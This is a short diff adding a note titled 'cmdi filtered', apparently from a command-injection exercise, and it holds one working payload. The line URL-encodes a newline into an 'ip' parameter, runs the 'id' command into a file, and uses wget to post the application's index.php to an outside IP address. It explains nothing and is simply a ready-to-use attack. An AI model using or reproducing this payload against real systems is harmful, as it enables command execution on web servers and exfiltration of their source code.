@@ -1,0 +1,4 @@
+cmdi filtered
+=============
+
+ip=8.8.8.8%0a`id>/tmp/id.txt;%0awget --post-file=index.php http://91.121.157.120:8891`
